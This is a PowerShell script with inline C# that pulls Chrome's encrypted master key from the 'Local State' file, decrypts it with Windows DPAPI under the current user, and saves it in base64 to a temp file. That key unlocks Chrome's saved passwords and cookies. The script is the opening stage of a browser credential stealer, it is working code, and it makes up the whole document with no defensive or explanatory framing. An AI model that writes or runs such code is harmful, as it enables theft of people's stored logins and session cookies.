Add-Type -AssemblyName System.Security
Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class ChromeDecryptor {
    public static byte[] GetMasterKey(string localStatePath) {
        string json = File.ReadAllText(localStatePath);
        int idx = json.IndexOf("\"encrypted_key\":");
        if (idx == -1) return null;
        int start = json.IndexOf("\"", idx + 16) + 1;
        int end = json.IndexOf("\"", start);
        string b64 = json.Substring(start, end - start);
        byte[] encryptedKeyWithHeader = Convert.FromBase64String(b64);
        byte[] encryptedKey = new byte[encryptedKeyWithHeader.Length - 5];
        Array.Copy(encryptedKeyWithHeader, 5, encryptedKey, 0, encryptedKey.Length);
        return ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
    }
}
"@

$localState = "C:\Users\user\AppData\Local\Google\Chrome\User Data\Local State"
$masterKey = [ChromeDecryptor]::GetMasterKey($localState)
if ($masterKey) {
    Write-Host "Master Key acquired successfully! Length: $($masterKey.Length)"
    [Convert]::ToBase64String($masterKey) | Out-File "$env:TEMP\chrome_master_key.txt" -Encoding ascii
} else {
    Write-Host "Failed to get Master Key"
}
